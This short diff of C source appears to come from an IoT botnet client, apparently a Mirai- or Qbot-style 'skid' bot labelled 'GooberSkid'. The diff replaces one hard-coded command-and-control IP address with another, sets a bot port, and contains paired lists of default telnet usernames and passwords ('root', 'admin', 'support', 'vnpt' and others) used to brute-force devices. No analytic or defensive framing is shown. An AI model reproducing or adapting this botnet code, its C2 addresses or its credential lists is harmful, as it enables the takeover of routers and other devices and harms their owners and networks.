@@ -53,7 +53,7 @@ system("New Get build");
 #define PHI 0x9e3779b9
 #define VERSION "GooberSkid <3"
 #define NETIS "AA\x00\x00AAAA"
-unsigned char *hekkertelnet[] = { "80.211.219.94" };
+unsigned char *hekkertelnet[] = { "188.127.251.171" };
 int Server_Botport = 151;
 char *usernames[] = {"666666\0", "support\0", "default\0", "root\0", "root\0", "admin\0", "root\0", "admin\0", "root\0", "admin\0", "admin\0", "root\0", "support\0", "root\0", "supervisor\0", "root\0", "root\0", "root\0"};
 char *passwords[] = {"666666\0", "support\0", "\0", "\0", "root\0", "admin\0", "1234\0", "root\0", "123456\0", "1234\0", "vnpt\0", "1234567890\0", "support\0", "antslq\0", "zyad1234\0", "anko\0", "tini\0", "letacla\0"};
